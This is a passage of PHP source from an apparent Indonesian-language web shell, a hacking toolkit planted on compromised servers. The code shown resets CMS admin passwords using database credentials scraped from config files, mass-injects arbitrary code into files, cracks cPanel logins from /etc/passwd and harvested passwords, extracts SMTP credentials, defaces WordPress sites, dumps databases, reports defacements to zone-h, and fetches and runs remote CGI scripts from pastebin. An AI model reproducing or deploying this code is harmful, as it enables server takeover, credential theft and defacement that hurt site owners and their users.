                    $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                    $db = mysql_select_db($dbname);
                    $q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
                    $result = mysql_fetch_array($q);
                    $id = $result[user_id];
                    $q2 = mysql_query("SELECT * FROM $option WHERE path='web/secure/base_url'");
                    $result2 = mysql_fetch_array($q2);
                    $target = $result2[value];
                    if($target == '') {
                        $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
                    } else {
                        $url_target = "Login => <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>";
                    }
                    $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
                    echo "Config => ".$file_conf."<br>";
                    echo "CMS => Magento<br>";
                    echo $url_target;
                    if(!$update OR !$conn OR !$db) {
                        echo "Status => <font color=red>".mysql_error()."</font><br><br>";
                    } else {
                        echo "Status => <font color=#FDF105>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
                    }
                    mysql_close($conn);
                } elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/",$config)) {
                    $dbhost = ambilkata($config,"'DB_HOSTNAME', '","'");
                    $dbuser = ambilkata($config,"'DB_USERNAME', '","'");
                    $dbpass = ambilkata($config,"'DB_PASSWORD', '","'");
                    $dbname = ambilkata($config,"'DB_DATABASE', '","'");
                    $dbprefix = ambilkata($config,"'DB_PREFIX', '","'");
                    $prefix = $dbprefix."user";
                    $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                    $db = mysql_select_db($dbname);
                    $q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
                    $result = mysql_fetch_array($q);
                    $id = $result[user_id];
                    $target = ambilkata($config,"HTTP_SERVER', '","'");
                    if($target == '') {
                        $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
                    } else {
                        $url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a><br>";
                    }
                    $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
                    echo "Config => ".$file_conf."<br>";
                    echo "CMS => OpenCart<br>";
                    echo $url_target;
                    if(!$update OR !$conn OR !$db) {
                        echo "Status => <font color=red>".mysql_error()."</font><br><br>";
                    } else {
                        echo "Status => <font color=#FDF105>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
                    }
                    mysql_close($conn);
                } elseif(preg_match("/panggil fungsi validasi xss dan injection/",$config)) {
                    $dbhost = ambilkata($config,'server = "','"');
                    $dbuser = ambilkata($config,'username = "','"');
                    $dbpass = ambilkata($config,'password = "','"');
                    $dbname = ambilkata($config,'database = "','"');
                    $prefix = "users";
                    $option = "identitas";
                    $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                    $db = mysql_select_db($dbname);
                    $q = mysql_query("SELECT * FROM $option ORDER BY id_identitas ASC");
                    $result = mysql_fetch_array($q);
                    $target = $result[alamat_website];
                    if($target == '') {
                        $target2 = $result[url];
                        $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
                        if($target2 == '') {
                            $url_target2 = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
                        } else {
                            $cek_login3 = file_get_contents("$target2/adminweb/");
                            $cek_login4 = file_get_contents("$target2/lokomedia/adminweb/");
                            if(preg_match("/CMS Lokomedia|Administrator/", $cek_login3)) {
                                $url_target2 = "Login => <a href='$target2/adminweb' target='_blank'><u>$target2/adminweb</u></a><br>";
                            } elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login4)) {
                                $url_target2 = "Login => <a href='$target2/lokomedia/adminweb' target='_blank'><u>$target2/lokomedia/adminweb</u></a><br>";
                            } else {
                                $url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
                            }
                        }
                    } else {
                        $cek_login = file_get_contents("$target/adminweb/");
                        $cek_login2 = file_get_contents("$target/lokomedia/adminweb/");
                        if(preg_match("/CMS Lokomedia|Administrator/", $cek_login)) {
                            $url_target = "Login => <a href='$target/adminweb' target='_blank'><u>$target/adminweb</u></a><br>";
                        } elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login2)) {
                            $url_target = "Login => <a href='$target/lokomedia/adminweb' target='_blank'><u>$target/lokomedia/adminweb</u></a><br>";
                        } else {
                            $url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
                        }
                    }
                    $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE level='admin'");
                    echo "Config => ".$file_conf."<br>";
                    echo "CMS => Lokomedia<br>";
                    if(preg_match('/error, gabisa ambil nama domain nya/', $url_target)) {
                        echo $url_target2;
                    } else {
                        echo $url_target;
                    }
                    if(!$update OR !$conn OR !$db) {
                        echo "Status => <font color=red>".mysql_error()."</font><br><br>";
                    } else {
                        echo "Status => <font color=#FDF105>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
                    }
                    mysql_close($conn);
                }
            }
        }
    } else {
        echo "<center>
        <h1>Auto Edit User Config</h1>
        <form method='post'>
        DIR Config: <br>
        <input type='text' size='50' name='config_dir' value='$dir'><br><br>
        Set User & Pass: <br>
        <input type='text' name='user_baru' value='Firewall21' placeholder='user_baru'><br>
        <input type='text' name='pass_baru' value='Firewall21' placeholder='pass_baru'><br>
        <input type='submit' name='hajar' value='Hajar!' style='width: 215px;'>
        </form>
        <span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br>
        ";
    }
}
elseif($_GET['do'] == 'code') {
echo '<center><h1>Mass Code Injector</h1></center>';
    echo '<div class="content">';
    
    if(stristr(php_uname(),"Windows")) { $DS = "\\"; } else if(stristr(php_uname(),"Linux")) { $DS = '/'; }
    function get_structure($path,$depth) {
        global $DS;
        $res = array();
        if(in_array(0, $depth)) { $res[] = $path; }
        if(in_array(1, $depth) or in_array(2, $depth) or in_array(3, $depth)) {
            $tmp1 = glob($path.$DS.'*',GLOB_ONLYDIR);
            if(in_array(1, $depth)) { $res = array_merge($res,$tmp1); }
        }
        if(in_array(2, $depth) or in_array(3, $depth)) {
            $tmp2 = array();
            foreach($tmp1 as $t){
                $tp2 = glob($t.$DS.'*',GLOB_ONLYDIR);
                $tmp2 = array_merge($tmp2, $tp2);
            }
            if(in_array(2, $depth)) { $res = array_merge($res,$tmp2); }
        }
        if(in_array(3, $depth)) {
            $tmp3 = array();
            foreach($tmp2 as $t){
                $tp3 = glob($t.$DS.'*',GLOB_ONLYDIR);
                $tmp3 = array_merge($tmp3, $tp3);
            }
            $res = array_merge($res,$tmp3);
        }
        return $res;
    }

    if(isset($_POST['submit']) && $_POST['submit']=='Inject') {
        $name = $_POST['name'] ? $_POST['name'] : '*';
        $type = $_POST['type'] ? $_POST['type'] : 'html';
        $path = $_POST['path'] ? $_POST['path'] : getcwd();
        $code = $_POST['code'] ? $_POST['code'] : 'Pakistan Haxors Crew';
        $mode = $_POST['mode'] ? $_POST['mode'] : 'a';
        $depth = sizeof($_POST['depth']) ? $_POST['depth'] : array('0');
        $dt = get_structure($path,$depth);
        foreach ($dt as $d) {
            if($mode == 'a') {
                if(file_put_contents($d.$DS.$name.'.'.$type, $code, FILE_APPEND)) {
                    echo '<div><strong>'.$d.$DS.$name.'.'.$type.'</strong><span style="color:#FDF105;"> was injected</span></div>';
                } else {
                    echo '<div><span style="color:#ff0066;">failed to inject</span> <strong>'.$d.$DS.$name.'.'.$type.'</strong></div>';
                }
            } else {
                if(file_put_contents($d.$DS.$name.'.'.$type, $code)) {
                    echo '<div><strong>'.$d.$DS.$name.'.'.$type.'</strong><span style="color:#FDF105;"> was injected</span></div>';
                } else {
                    echo '<div><span style="color:#ff0066;">failed to inject</span> <strong>'.$d.$DS.$name.'.'.$type.'</strong></div>';
                }
            }        
        }
    } else {
        echo '<form method="post" action="">
                <table align="center">
                    <tr>
                        <td>Directory : </td>
                        <td><input class="box" name="path" value="'.getcwd().'" size="50"/></td>
                    </tr>
                    <tr>
                        <td class="title">Mode : </td>
                        <td>
                            <select style="width: 100px;" name="mode" class="box">
                                <option value="a">Apender</option>
                                <option value="w">Overwriter</option>
                            </select>
                        </td>
                    </tr>
                    <tr>
                        <td class="title">File Name & Type : </td>
                        <td>
                            <input type="text" style="width: 100px;" name="name" value="*"/>&nbsp;&nbsp;
                            <select style="width: 100px;" name="type" class="box">
                            <option value="html">HTML</option>
                            <option value="htm">HTM</option>
                            <option value="php" selected="selected">PHP</option>
                            <option value="asp">ASP</option>
                            <option value="aspx">ASPX</option>
                            <option value="xml">XML</option>
                            <option value="txt">TXT</option>
                        </select></td>
                    </tr>
                    <tr>
                        <td class="title">Code Inject Depth : </td>
                        <td>
                            <input type="checkbox" name="depth[]" value="0" checked="checked"/>&nbsp;0&nbsp;&nbsp;
                            <input type="checkbox" name="depth[]" value="1"/>&nbsp;1&nbsp;&nbsp;
                            <input type="checkbox" name="depth[]" value="2"/>&nbsp;2&nbsp;&nbsp;
                            <input type="checkbox" name="depth[]" value="3"/>&nbsp;3
                        </td>
                    </tr>        
                    <tr>
                        <td colspan="2"><textarea name="code" cols="70" rows="10" class="box"></textarea></td>
                    </tr>                        
                    <tr>
                        <td colspan="2" style="text-align: center;">
                            <input type="hidden" name="a" value="Injector">
                            <input type="hidden" name="c" value="'.htmlspecialchars($GLOBALS['cwd']).'">
                            <input type="hidden" name="p1">
                            <input type="hidden" name="p2">
                            <input type="hidden" name="charset" value="'.(isset($_POST['charset'])?$_POST['charset']:'').'">
                            <input style="padding :5px; width:100px;" name="submit" type="submit" value="Inject"/></td>
                    </tr>
                </table>
        </form>';
    }
    echo '</div>';

}
elseif($_GET['do'] == 'shelscan') {
    echo'<center><h2>Shell Finder</h2>
<form action="" method="post">
<input type="text" size="50" name="traget" value="http://www.site.com/"/>
<br>
<input name="scan" value="Start Scaning"  style="width: 215px;" type="submit">
</form><br>';
if (isset($_POST["scan"])) {  
$url = $_POST['traget'];
echo "<br /><span class='start'>Scanning ".$url."<br /><br /></span>";
echo "Result :<br />";
$shells = array("WSO.php","dz.php","cpanel.php","cpn.php","sql.php","mysql.php","madspot.php","cp.php","cpbt.php","sYm.php",
"x.php","r99.php","lol.php","jo.php","wp.php","whmcs.php","shellz.php","d0main.php","d0mains.php","users.php",
"Cgishell.pl","killer.php","changeall.php","2.php","Sh3ll.php","dz0.php","dam.php","user.php","dom.php","whmcs.php",
"vb.zip","r00t.php","c99.php","gaza.php","1.php","wp.zip"."wp-content/plugins/disqus-comment-system/disqus.php",
"d0mains.php","wp-content/plugins/akismet/akismet.php","madspotshell.php","Sym.php","c22.php","c100.php",
"wp-content/plugins/akismet/admin.php#","wp-content/plugins/google-sitemap-generator/sitemap-core.php#",
"wp-content/plugins/akismet/widget.php#","Cpanel.php","zone-h.php","tmp/user.php","tmp/Sym.php","cp.php",
"tmp/madspotshell.php","tmp/root.php","tmp/whmcs.php","tmp/index.php","tmp/2.php","tmp/dz.php","tmp/cpn.php",
"tmp/changeall.php","tmp/Cgishell.pl","tmp/sql.php","tmp/admin.php","cliente/downloads/h4xor.php",
"whmcs/downloads/dz.php","L3b.php","d.php","tmp/d.php","tmp/L3b.php","wp-content/plugins/akismet/admin.php",
"templates/rhuk_milkyway/index.php","templates/beez/index.php","admin1.php","upload.php","up.php","vb.zip","vb.rar",
"admin2.asp","uploads.php","sa.php","sysadmins/","admin1/","administration/Sym.php","images/Sym.php",
"/r57.php","/wp-content/plugins/disqus-comment-system/disqus.php","/shell.php","/sa.php","/admin.php",
"/sa2.php","/2.php","/gaza.php","/up.php","/upload.php","/uploads.php","/templates/beez/index.php","shell.php","/amad.php",
"/t00.php","/dz.php","/site.rar","/Black.php","/site.tar.gz","/home.zip","/home.rar","/home.tar","/home.tar.gz",
"/forum.zip","/forum.rar","/forum.tar","/forum.tar.gz","/test.txt","/ftp.txt","/user.txt","/site.txt","/error_log","/error",
"/cpanel","/awstats","/site.sql","/vb.sql","/forum.sql","/backup.sql","/back.sql","/data.sql","wp.rar/",
"wp-content/plugins/disqus-comment-system/disqus.php","asp.aspx","/templates/beez/index.php","tmp/vaga.php",
"tmp/killer.php","whmcs.php","tmp/killer.php","tmp/domaine.pl","tmp/domaine.php","useradmin/",
"tmp/d0maine.php","d0maine.php","tmp/sql.php","tmp/dz1.php","dz1.php","forum.zip","Symlink.php","Symlink.pl", 
"forum.rar","joomla.zip","joomla.rar","wp.php","buck.sql","sysadmin.php","images/c99.php", "xd.php", "c100.php",
"spy.aspx","xd.php","tmp/xd.php","sym/root/home/","billing/killer.php","tmp/upload.php","tmp/admin.php",
"Server.php","tmp/uploads.php","tmp/up.php","Server/","wp-admin/c99.php","tmp/priv8.php","priv8.php","cgi.pl/", 
"tmp/cgi.pl","downloads/dom.php","templates/ja-helio-farsi/index.php","webadmin.html","admins.php",
"/wp-content/plugins/count-per-day/js/yc/d00.php", "admins/","admins.asp","admins.php","wp.zip","wso2.5.1","pasir.php","pasir2.php","up.php","cok.php","newfile.php","upl.php",".php","a.php","crot.php","kontol.php","hmei7.php","jembut.php","memek.php","tai.php","rabit.php","indoxploit.php","a.php","hemb.php","hack.php","galau.php","HsH.php","indoXploit.php","asu.php","wso.php","lol.php","idx.php","rabbit.php","1n73ction.php","k.php","mailer.php","mail.php","temp.php","c.php","d.php","IDB.php","indo.php","indonesia.php","semvak.php","ndasmu.php","act.php","as.php","ad.php","aa.php","file.php","peju.php","asd.php","configs.php","ass.php","z.php");
foreach ($shells as $shell){
$headers = get_headers("$url$shell"); // 
if (eregi('200', $headers[0])) {
echo "<a href='$url$shell'>$url$shell</a> <span class='found'>Done :D</span><br /><br/><br/>"; // 
$dz = fopen('shells.txt', 'a+');
$suck = "$url$shell";
fwrite($dz, $suck."\n");
}
}
echo "Shell [ <a href='./shells.txt' target='_blank'>shells.txt</a> ]</span>";
}
    
}
 elseif($_GET['do'] == 'cpanel') {
    if($_POST['crack']) {
        $usercp = explode("\r\n", $_POST['user_cp']);
        $passcp = explode("\r\n", $_POST['pass_cp']);
        $i = 0;
        foreach($usercp as $ucp) {
            foreach($passcp as $pcp) {
                if(@mysql_connect('localhost', $ucp, $pcp)) {
                    if($_SESSION[$ucp] && $_SESSION[$pcp]) {
                    } else {
                        $_SESSION[$ucp] = "1";
                        $_SESSION[$pcp] = "1";
                        $i++;
                        echo "username (<font color=#FDF105>$ucp</font>) password (<font color=#FDF105>$pcp</font>)<br>";
                    }
                }
            }
        }
        if($i == 0) {
        } else {
            echo "<br>Nemu ".$i." Cpanel by <font color=#FDF105>Janact</font>";
        }
    } else {
        echo "<center>
        <form method='post'>
        USER: <br>
        <textarea style='width: 450px; height: 150px;' name='user_cp'>";
        $_usercp = fopen("/etc/passwd","r");
        while($getu = fgets($_usercp)) {
            if($getu == '' || !$_usercp) {
                echo "<font color=red>Can't read /etc/passwd</font>";
            } else {
                preg_match_all("/(.*?):x:/", $getu, $u);
                foreach($u[1] as $user_cp) {
                        if(is_dir("/home/$user_cp/public_html")) {
                            echo "$user_cp\n";
                    }
                }
            }
        }
        echo "</textarea><br>
        PASS: <br>
        <textarea style='width: 450px; height: 200px;' name='pass_cp'>";
        function cp_pass($dir) {
            $pass = "";
            $dira = scandir($dir);
            foreach($dira as $dirb) {
                if(!is_file("$dir/$dirb")) continue;
                $ambil = file_get_contents("$dir/$dirb");
                if(preg_match("/WordPress/", $ambil)) {
                    $pass .= ambilkata($ambil,"DB_PASSWORD', '","'")."\n";
                } elseif(preg_match("/JConfig|joomla/", $ambil)) {
                    $pass .= ambilkata($ambil,"password = '","'")."\n";
                } elseif(preg_match("/Magento|Mage_Core/", $ambil)) {
                    $pass .= ambilkata($ambil,"<password><![CDATA[","]]></password>")."\n";
                } elseif(preg_match("/panggil fungsi validasi xss dan injection/", $ambil)) {
                    $pass .= ambilkata($ambil,'password = "','"')."\n";
                } elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/", $ambil)) {
                    $pass .= ambilkata($ambil,"'DB_PASSWORD', '","'")."\n";
                } elseif(preg_match("/client/", $ambil)) {
                    preg_match("/password=(.*)/", $ambil, $pass1);
                    if(preg_match('/"/', $pass1[1])) {
                        $pass1[1] = str_replace('"', "", $pass1[1]);
                        $pass .= $pass1[1]."\n";
                    }
                } elseif(preg_match("/cc_encryption_hash/", $ambil)) {
                    $pass .= ambilkata($ambil,"db_password = '","'")."\n";
                }
            }
            echo $pass;
        }
        $cp_pass = cp_pass($dir);
        echo $cp_pass;
        echo "</textarea><br>
        <input type='submit' name='crack' style='width: 450px;' value='Crack'>
        </form>
        <span>NB: CPanel Crack ini sudah auto get password ( pake db password ) maka akan work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br></center>";
    }
} elseif($_GET['do'] == 'smtp') {
    echo "<center><span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span></center><br>";
    function scj($dir) {
        $dira = scandir($dir);
        foreach($dira as $dirb) {
            if(!is_file("$dir/$dirb")) continue;
            $ambil = file_get_contents("$dir/$dirb");
            $ambil = str_replace("$", "", $ambil);
            if(preg_match("/JConfig|joomla/", $ambil)) {
                $smtp_host = ambilkata($ambil,"smtphost = '","'");
                $smtp_auth = ambilkata($ambil,"smtpauth = '","'");
                $smtp_user = ambilkata($ambil,"smtpuser = '","'");
                $smtp_pass = ambilkata($ambil,"smtppass = '","'");
                $smtp_port = ambilkata($ambil,"smtpport = '","'");
                $smtp_secure = ambilkata($ambil,"smtpsecure = '","'");
                echo "SMTP Host: <font color=#FDF105>$smtp_host</font><br>";
                echo "SMTP port: <font color=#FDF105>$smtp_port</font><br>";
                echo "SMTP user: <font color=#FDF105>$smtp_user</font><br>";
                echo "SMTP pass: <font color=#FDF105>$smtp_pass</font><br>";
                echo "SMTP auth: <font color=#FDF105>$smtp_auth</font><br>";
                echo "SMTP secure: <font color=#FDF105>$smtp_secure</font><br><br>";
            }
        }
    }
    $smpt_hunter = scj($dir);
    echo $smpt_hunter;
} elseif($_GET['do'] == 'auto_wp') {
    if($_POST['hajar']) {
        $title = htmlspecialchars($_POST['new_title']);
        $pn_title = str_replace(" ", "-", $title);
        if($_POST['cek_edit'] == "Y") {
            $script = $_POST['edit_content'];
        } else {
            $script = $title;
        }
        $conf = $_POST['config_dir'];
        $scan_conf = scandir($conf);
        foreach($scan_conf as $file_conf) {
            if(!is_file("$conf/$file_conf")) continue;
            $config = file_get_contents("$conf/$file_conf");
            if(preg_match("/WordPress/", $config)) {
                $dbhost = ambilkata($config,"DB_HOST', '","'");
                $dbuser = ambilkata($config,"DB_USER', '","'");
                $dbpass = ambilkata($config,"DB_PASSWORD', '","'");
                $dbname = ambilkata($config,"DB_NAME', '","'");
                $dbprefix = ambilkata($config,"table_prefix  = '","'");
                $prefix = $dbprefix."posts";
                $option = $dbprefix."options";
                $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                $db = mysql_select_db($dbname);
                $q = mysql_query("SELECT * FROM $prefix ORDER BY ID ASC");
                $result = mysql_fetch_array($q);
                $id = $result[ID];
                $q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
                $result2 = mysql_fetch_array($q2);
                $target = $result2[option_value];
                $update = mysql_query("UPDATE $prefix SET post_title='$title',post_content='$script',post_name='$pn_title',post_status='publish',comment_status='open',ping_status='open',post_type='post',comment_count='1' WHERE id='$id'");
                $update .= mysql_query("UPDATE $option SET option_value='$title' WHERE option_name='blogname' OR option_name='blogdescription'");
                echo "<div style='margin: 5px auto;'>";
                if($target == '') {
                    echo "URL: <font color=red>error, gabisa ambil nama domain nya</font> -> ";
                } else {
                    echo "URL: <a href='$target/?p=$id' target='_blank'>$target/?p=$id</a> -> ";
                }
                if(!$update OR !$conn OR !$db) {
                    echo "<font color=red>MySQL Error: ".mysql_error()."</font><br>";
                } else {
                    echo "<font color=#FDF105>sukses di ganti.</font><br>";
                }
                echo "</div>";
                mysql_close($conn);
            }
        }
    } else {
        echo "<center>
        <h1>Auto Edit Title+Content WordPress</h1>
        <form method='post'>
        DIR Config: <br>
        <input type='text' size='50' name='config_dir' value='$dir'><br><br>
        Set Title: <br>
        <input type='text' name='new_title' value='Hacked By FirewalL21' placeholder='New Title'><br><br>
        Edit Content?: <input type='radio' name='cek_edit' value='Y' checked>Y<input type='radio' name='cek_edit' value='N'>N<br>
        <span>Jika pilih <u>Y</u> masukin script defacemu ( saran yang simple aja ), kalo pilih <u>N</u> gausah di isi.</span><br>
        <textarea name='edit_content' placeholder='contoh script: http://pastebin.com/mRuiZDKR' style='width: 450px; height: 150px;'></textarea><br>
        <input type='submit' name='hajar' value='Hajar!' style='width: 450px;'><br>
        </form>
        <span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br>
        ";
    }
}
 elseif($_GET['do'] == 'dbdump')
    {
echo $head.'<p align="center">';
echo '
<form action method=post>
<table width=371 class=tabnet >
<tr><th colspan="2">Database Dump</th></tr>
<tr>
    <td>Server </td>
    <td><input class="inputz" type=text name=server size=52></td></tr><tr>
    <td>Username</td>
    <td><input class="inputz" type=text name=username size=52></td></tr><tr>
    <td>Password</td>
    <td><input class="inputz" type=text name=password size=52></td></tr><tr>
    <td>DataBase Name</td>
    <td><input class="inputz" type=text name=dbname size=52></td></tr>
    <tr>
    <td>DB Type </td>
    <td><form method=post action="'.$me.'">
    <select class="inputz" name=method>
        <option  value="gzip">Gzip</option>
        <option value="sql">Sql</option>
        </select>
    <input class="inputzbut" type=submit value="  Dump!  " ></td></tr>
    </form></center></table>';
if ($_POST['username'] && $_POST['dbname'] && $_POST['method']){
$date = date("Y-m-d");
$dbserver = $_POST['server'];
$dbuser = $_POST['username'];
$dbpass = $_POST['password'];
$dbname = $_POST['dbname'];
$file = "Dump-$dbname-$date";
$method = $_POST['method'];
if ($method=='sql'){
$file="Dump-$dbname-$date.sql";
$fp=fopen($file,"w");
}else{
$file="Dump-$dbname-$date.sql.gz";
$fp = gzopen($file,"w");
}
function write($data) {
global $fp;
if ($_POST['method']=='ssql'){
fwrite($fp,$data);
}else{
gzwrite($fp, $data);
}}
mysql_connect ($dbserver, $dbuser, $dbpass);
mysql_select_db($dbname);
$tables = mysql_query ("SHOW TABLES");
while ($i = mysql_fetch_array($tables)) {
    $i = $i['Tables_in_'.$dbname];
    $create = mysql_fetch_array(mysql_query ("SHOW CREATE TABLE ".$i));
    write($create['Create Table'].";nn");
    $sql = mysql_query ("SELECT * FROM ".$i);
    if (mysql_num_rows($sql)) {
        while ($row = mysql_fetch_row($sql)) {
            foreach ($row as $j => $k) {
                $row[$j] = "'".mysql_escape_string($k)."'";
            }
            write("INSERT INTO $i VALUES(".implode(",", $row).");n");
        }
    }
}
if ($method=='ssql'){
fclose ($fp);
}else{
gzclose($fp);}
header("Content-Disposition: attachment; filename=" . $file);   
header("Content-Type: application/download");
header("Content-Length: " . filesize($file));
flush();

$fp = fopen($file, "r");
while (!feof($fp))
{
    echo fread($fp, 65536);
    flush();
} 
fclose($fp); 
}

}
 elseif($_GET['do'] == 'zoneh') {
    if($_POST['submit']) {
        $domain = explode("\r\n", $_POST['url']);
        $nick =  $_POST['nick'];
        echo "Defacer Onhold: <a href='http://www.zone-h.org/archive/notifier=$nick/published=0' target='_blank'>http://www.zone-h.org/archive/notifier=$nick/published=0</a><br>";
        echo "Defacer Archive: <a href='http://www.zone-h.org/archive/notifier=$nick' target='_blank'>http://www.zone-h.org/archive/notifier=$nick</a><br><br>";
        function zoneh($url,$nick) {
            $ch = curl_init("http://www.zone-h.com/notify/single");
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                  curl_setopt($ch, CURLOPT_POST, true);
                  curl_setopt($ch, CURLOPT_POSTFIELDS, "defacer=$nick&domain1=$url&hackmode=1&reason=1&submit=Send");
            return curl_exec($ch);
                  curl_close($ch);
        }
        foreach($domain as $url) {
            $zoneh = zoneh($url,$nick);
            if(preg_match("/color=\"red\">OK<\/font><\/li>/i", $zoneh)) {
                echo "$url -> <font color=#FDF105>OK</font><br>";
            } else {
                echo "$url -> <font color=red>ERROR</font><br>";
            }
        }
    } else {
        echo "<center><form method='post'>
        <u>Defacer</u>: <br>
        <input type='text' name='nick' size='50' value'Achon666ju5t'><br>
        <u>Domains</u>: <br>
        <textarea style='width: 450px; height: 150px;' name='url'></textarea><br>
        <input type='submit' name='submit' value='Submit' style='width: 450px;'>
        </form>";
    }
    echo "</center>";
}elseif($_GET['do'] == 'lcf') {
    mkdir('LCF',0755);
chdir('LCF');
$kokdosya = ".htaccess";
$dosya_adi = "$kokdosya";
$dosya = fopen ($dosya_adi , 'w') or die ("Error mas broo!!!");
$metin = "OPTIONS Indexes Includes ExecCGI FollowSymLinks   \n AddType application/x-httpd-cgi .pl \n AddHandler cgi-script .pl \n AddHandler cgi-script .pl
\n \n Options \n DirectoryIndex seees.html \n RemoveHandler .php \n AddType application/octet-stream .php"; 
fwrite ( $dosya , $metin ) ;
 fclose ($dosya);
$file = fopen("lcf.pl","w+");
$write = fwrite ($file ,file_get_contents("http://pastebin.com/raw/26jAL0sz"));
fclose($file);
chmod("lcf.pl",0755);
echo "<iframe src=LCF/lcf.pl width=97% height=100% frameborder=0></iframe>";
}
 elseif($_GET['do'] == 'cgi') {
    $cgi_dir = mkdir('idx_cgi', 0755);
    $file_cgi = "idx_cgi/cgi.izo";
    $isi_htcgi = "AddHandler cgi-script .izo";
    $htcgi = fopen(".htaccess", "w");
    $cgi_script = file_get_contents("http://pastebin.com/raw.php?i=XTUFfJLg");
    $cgi = fopen($file_cgi, "w");
    fwrite($cgi, $cgi_script);
    fwrite($htcgi, $isi_htcgi);
    chmod($file_cgi, 0755);
    echo "<iframe src='idx_cgi/cgi.izo' width='100%' height='100%' frameborder='0' scrolling='no'></iframe>";
} elseif($_GET['do'] == 'fake_root') {
    ob_start();
    function reverse($url) {
        $ch = curl_init("http://domains.yougetsignal.com/domains.php");
              curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1 );
              curl_setopt($ch, CURLOPT_POSTFIELDS,  "remoteAddress=$url&ket=");
              curl_setopt($ch, CURLOPT_HEADER, 0);
              curl_setopt($ch, CURLOPT_POST, 1);
        $resp = curl_exec($ch);
        $resp = str_replace("[","", str_replace("]","", str_replace("\"\"","", str_replace(", ,",",", str_replace("{","", str_replace("{","", str_replace("}","", str_replace(", ",",", str_replace(", ",",",  str_replace("'","", str_replace("'","", str_replace(":",",", str_replace('"','', $resp ) ) ) ) ) ) ) ) ) ))));
        $array = explode(",,", $resp);
        unset($array[0]);
        foreach($array as $lnk) {
            $lnk = "http://$lnk";
            $lnk = str_replace(",", "", $lnk);
            echo $lnk."\n";
            ob_flush();
            flush();
        }
              curl_close($ch);
    }
    function cek($url) {
        $ch = curl_init($url);
              curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1 );
              curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        $resp = curl_exec($ch);
        return $resp;
    }
    $cwd = getcwd();
    $ambil_user = explode("/", $cwd);
    $user = $ambil_user[2];
    if($_POST['reverse']) {
        $site = explode("\r\n", $_POST['url']);
        $file = $_POST['file'];
        foreach($site as $url) {
            $cek = cek("$url/~$user/$file");
            if(preg_match("/hacked/i", $cek)) {
                echo "URL: <a href='$url/~$user/$file' target='_blank'>$url/~$user/$file</a> -> <font color=#FDF105>Fake Root!</font><br>";
            }
        }
    } else {
        echo "<center><form method='post'>
        Filename: <br><input type='text' name='file' value='deface.html' size='50' height='10'><br>
        User: <br><input type='text' value='$user' size='50' height='10' readonly><br>
        Domain: <br>
        <textarea style='width: 450px; height: 250px;' name='url'>";
        reverse($_SERVER['HTTP_HOST']);
        echo "</textarea><br>
        <input type='submit' name='reverse' value='Scan Fake Root!' style='width: 450px;'>
        </form><br>
        NB: Sebelum gunain Tools ini , upload dulu file deface kalian di dir /home/user/ dan /home/user/public_html.</center>";
    }
} elseif($_GET['do'] == 'adminer') {
    $full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
    function adminer($url, $isi) {
        $fp = fopen($isi, "w");
        $ch = curl_init();
              curl_setopt($ch, CURLOPT_URL, $url);
              curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
              curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
              curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
              curl_setopt($ch, CURLOPT_FILE, $fp);
        return curl_exec($ch);
              curl_close($ch);
        fclose($fp);
        ob_flush();
        flush();
    }
    if(file_exists('adminer.php')) {
        echo "<center><font color=#FDF105><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
    } else {
        if(adminer("https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php","adminer.php")) {
            echo "<center><font color=#FDF105><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
        } else {
        }
            echo "<center><font color=red>gagal buat file adminer</font></center>";
    }
}elseif($_GET['do'] == 'passwbypass') {
    echo '<center>Bypass etc/passw With:<br>
<table style="width:50%">
  <tr>
    <td><form method="post"><input type="submit" value="System Function" name="syst"></form></td>
    <td><form method="post"><input type="submit" value="Passthru Function" name="passth"></form></td>
    <td><form method="post"><input type="submit" value="Exec Function" name="ex"></form></td>   
    <td><form method="post"><input type="submit" value="Shell_exec Function" name="shex"></form></td>       
    <td><form method="post"><input type="submit" value="Posix_getpwuid Function" name="melex"></form></td>
</tr></table>Bypass User With : <table style="width:50%">
<tr>
